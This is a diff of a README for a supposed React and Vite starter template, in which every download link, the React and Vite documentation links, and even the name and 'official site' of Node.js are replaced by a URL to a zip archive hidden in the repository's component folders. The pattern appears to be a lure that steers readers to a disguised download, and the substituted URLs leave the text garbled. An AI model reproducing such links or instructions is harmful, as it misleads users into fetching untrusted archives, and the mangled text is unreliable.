@@ -1,6 +1,6 @@
 # 🎉 React_Vite - Fast, Modern Starter for Web Apps
 
-[![Download Now](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip%https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
+[![Download Now](https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip%https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip)](https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ React_Vite is a starter template that helps you build web applications with Reac
 
 To get started, you need to visit the Releases page to download the software. Click the link below:
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
+[Visit Releases Page to Download](https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip)
 
 On the Releases page, you will see a list of available versions. Choose the most recent one and select the file that works for your system.
 
@@ -21,18 +21,18 @@ On the Releases page, you will see a list of available versions. Choose the most
 Before you continue, make sure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip**: Version 14 or higher (https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip is a JavaScript runtime installed on your computer)
-- **NPM**: Version 6 or higher (NPM is a package manager that comes with https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
+- **https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip**: Version 14 or higher (https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip is a JavaScript runtime installed on your computer)
+- **NPM**: Version 6 or higher (NPM is a package manager that comes with https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip)
 
-You can download https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip from the official site: [https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip Download](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip).
+You can download https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip from the official site: [https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip Download](https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip).
 
 ## 🛠 Installation Steps
 
-1. **Download https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip**: 
-   Go to the https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip website and install the version suitable for your operating system.
+1. **Download https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip**: 
+   Go to the https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip website and install the version suitable for your operating system.
 
 2. **Verify Installation**:
-   After installation, open your command prompt or terminal and type the following commands to check if https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip and NPM are installed correctly:
+   After installation, open your command prompt or terminal and type the following commands to check if https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip and NPM are installed correctly:
    ```
    node -v
    npm -v
@@ -82,13 +82,13 @@ If you have questions or need assistance, feel free to reach out to the communit
 
 To ensure you are using the latest version, keep an eye on the Releases page. Check it regularly for updates, new features, and improvements.
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip) 
+[Visit Releases Page to Download](https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip) 
 
 ## 🎮 Additional Resources
 
 For more information on React and Vite, here are some helpful resources:
 
-- [React Documentation](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
-- [Vite Documentation](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
+- [React Documentation](https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip)
+- [Vite Documentation](https://github.com/Asak96/React_Vite/raw/refs/heads/main/src/components/payment-payhere/Vite-React-v1.6.zip)
 
 This guide should help you get up and running with React_Vite. If you encounter any issues, don't hesitate to seek help. Happy coding!
